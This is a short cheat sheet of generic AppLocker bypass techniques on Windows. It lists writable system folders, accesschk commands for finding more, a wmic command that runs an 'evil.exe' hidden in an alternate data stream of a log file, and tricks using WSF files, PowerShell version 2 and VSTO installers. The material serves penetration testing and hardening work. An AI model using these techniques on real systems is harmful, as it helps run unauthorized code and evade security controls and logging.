This list contains generic methods of bypassing AppLocker.

## Placing files in writeable paths

The following folders are by default writable and executable by normal users (depends on Windows version)
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\drivers\color

C:\Windows\Tasks

C:\windows\tracing
```

You can check the for additional paths by running accesschk from sysinternals and supplying these commands:
```
accesschk -w -s -q -u Users "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Everyone "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Interactive "C:\Program Files" >> programfiles.txt

accesschk -w -s -q -u Users "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Everyone "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Interactive "C:\Program Files (x86)" >> programfilesx86.txt

accesschk -w -s -q -u Users "C:\Windows" >> windows.txt
accesschk -w -s -q -u Everyone "C:\Windows" >> windows.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Windows" >> windows.txt
accesschk -w -s -q -u Interactive "C:\Windows" >> windows.txt
```

Example on adding binary to a writable file under program files (using ADS):
```
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"

wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
```
    
    
    
## .WSF files

```
script.wsf
```
.WSF files are supposed to not be blocked by AppLocker
    
    
    
## PowerShell version 2

```
Powershell -version 2
```
Bypasses Constrained language mode in PowerShell (and also logging). To fix this Powershell version 2 should be removed from Add/Remove Windows features. 
   
   
    
## Visual Studio Tools for Office - .VSTO files

```
evilfile.vsto
```

You need to build a solution using Visual Studio Tools for Office. 
User needs to confirm installation after executing. 

* https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/
      
     
     
## NTFS Alternate Data Streams (ADS)

AppLocker rules does not stop things that execute in ADS. More info on that here: https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/
This means you can pipe data to a stream and execute it using many of the different methods:
https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
